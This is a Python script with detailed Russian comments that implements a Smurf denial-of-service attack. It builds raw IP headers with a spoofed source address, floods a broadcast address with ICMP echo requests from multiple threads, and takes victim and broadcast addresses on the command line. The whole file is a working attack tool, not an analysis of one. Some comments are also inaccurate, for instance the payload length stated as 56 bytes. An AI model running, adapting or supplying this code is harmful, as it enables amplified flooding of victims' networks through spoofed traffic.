import socket  # Импорт socket: для сырых сокетов и IP преобразований. Зачем: создание сокета для отправки поддельных пакетов.
import sys  # Импорт sys: для argv и exit. Зачем: чтение аргументов (source_ip, broadcast_ip, num_threads).
import threading  # Импорт threading: для потоков. Зачем: многопоточная атака для увеличения скорости.
import signal  # Импорт signal: для Ctrl+C. Зачем: не используется напрямую, но в коде есть KeyboardInterrupt.
import time  # Импорт time: для sleep. Зачем: задержка между пакетами.
# Глобальная переменная для остановки всех потоков
stop_event = threading.Event()  # Event для флага остановки. Зачем: аналогично trace.py, set() при Ctrl+C.

def IPHeader(source, destination, proto):  # Функция создания IP-заголовка. Параметры: source/destination – str IP, proto – bytes (e.g., b'\x01' для ICMP). Возвращает: bytes.
    packet = b''  # Пустые bytes.
    packet += b'\x45'  # Version 4 + IHL=5 (0x45). Зачем: фиксировано.
    packet += b'\x00'  # TOS=0.
    packet += b'\x00\x54'  # Total length=84 (0x0054)? Но в коде hardcoded, хотя пакет IP=20 + ICMP=64? Нюанс: 20+8+56=84 да (0x54=84).
    packet += b'\x23\x2c'  # ID=9004 (0x232c). Hardcoded.
    packet += b'\x40'  # Flags: 0x40 = Don't Fragment? Нет, flags 3 байта, но здесь байт? Ошибка? Фактически это часть flags (high byte).
    packet += b'\x00'  # Fragment offset=0.
    packet += b'\x40'  # TTL=64 (0x40).
    packet += proto  # Protocol (b'\x01'=ICMP).
    packet += b'\x0a\x0a'  # Checksum=2570 (0x0a0a), но комментарий говорит "python does the work" – но здесь hardcoded, не рассчитывается! Нюанс: вероятно, placeholder, но в send Python не пересчитывает для raw с HDRINCL.
    packet += socket.inet_aton(source)  # Source IP packed.
    packet += socket.inet_aton(destination)  # Dest IP.
    return packet  # Возврат. Нюанс: checksum hardcoded – может быть invalid, но в raw Python не проверяет; в реальности нужен расчет как в trace.py.

def CreateICMPRequest():  # Функция создания ICMP Echo Request. Параметры: нет. Возвращает: bytes.
    packet = b''  # Пустые.
    packet += b'\x08'  # Type=8 (Echo Req).
    packet += b'\x00'  # Code=0.
    packet += b'\xbd\xcb'  # Checksum=0xbdcb (hardcoded, для этого payload).
    packet += b'\x16\x4f'  # ID=0x164f=5711.
    packet += b'\x00\x01'  # Seq=1 (hardcoded, не меняется!).
    packet += b'\x92\xde\xe2\x50\x00\x00\x00\x00\xe1\xe1\x0e\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37' *4   # Data: последовательность байт (от 0x92... до 0x37='7'), повторенная 4 раза. Длина=56 байт (стандарт для ping). Зачем: filler data, как в ping.
    return packet

import time  # Повторный import time – избыточно, но ок.

def send_requests(source_ip, broadcast_ip):  # Функция отправки пакетов в цикле. Параметры: source_ip, broadcast_ip (str).
    try:  # Try для создания сокета.
        icmpsocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)  # Raw сокет для ICMP.
        icmpsocket.bind(('', 1))  # Bind на любой IP, порт 1 (ICMP не порты, но bind нужен для raw).
        icmpsocket.setblocking(0)  # Non-blocking mode: recv не блокирует.
        icmpsocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)  # Включить IP header.
        icmpsocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Разрешить broadcast.
    except socket.error as e:  # Ловля ошибок (e.g., no root).
        print(f"Socket error: {e}")
        return

    try:  # Try для connect и отправки.
        icmpsocket.connect((broadcast_ip, 1))  # Connect к broadcast, порт 1: упрощает send (без sendto).
        #count=0
        #while count == 0:  # Закомментировано – infinite? Нет, ниже while.
        while not stop_event.is_set():  # Цикл пока не stop.
            packet = IPHeader(source_ip, broadcast_ip, proto=b'\x01') + CreateICMPRequest()  # Сборка пакета.
            icmpsocket.send(packet)  # Отправка (connect позволяет send без to).
            #count += 1
            time.sleep(0.05)  # Задержка 50 мс. Зачем: контроль скорости атаки, не flood сразу.
    except Exception as e:  # Ловля ошибок отправки.
        print(f"Error during packet sending: {e}")
    finally:  # Всегда закрыть.
        icmpsocket.close()

def smurfattack(source_ip, broadcast_ip, num_threads):  # Главная функция атаки. Параметры: source_ip, broadcast_ip (str), num_threads (int).
    threads = []  # Список потоков.
    for i in range(num_threads):  # Создание num_threads потоков.
        thread = threading.Thread(target=send_requests, args=(source_ip, broadcast_ip))  # Thread с target=send_requests.
        thread.start()  # Запуск.
        threads.append(thread)

    print("Attack started. Press Ctrl+C to stop.")  # Сообщение.

    try:  # Try для join.
        for thread in threads:
            thread.join()  # Ждать все.
    except KeyboardInterrupt:  # Ловля Ctrl+C (KeyboardInterrupt).
        print("Stopping attack...")
        stop_event.set()  # Set флаг.
        for thread in threads:
            thread.join()  # Еще раз join (теперь они остановятся).
        print("Attack stopped.")

def help_smurfattack():  # Функция помощи.
    print("Usage: smurfattack <source IP> <broadcast address> <number of threads>")  # Печать usage.

if __name__ == "__main__":  # Guard.
    if len(sys.argv) != 4:  # Проверка 3 аргумента.
        help_smurfattack()
        sys.exit(1)

    source_ip = sys.argv[1]  # Аргументы.
    broadcast_ip = sys.argv[2]
    num_threads = int(sys.argv[3])

    smurfattack(source_ip, broadcast_ip, num_threads)  # Запуск атаки.
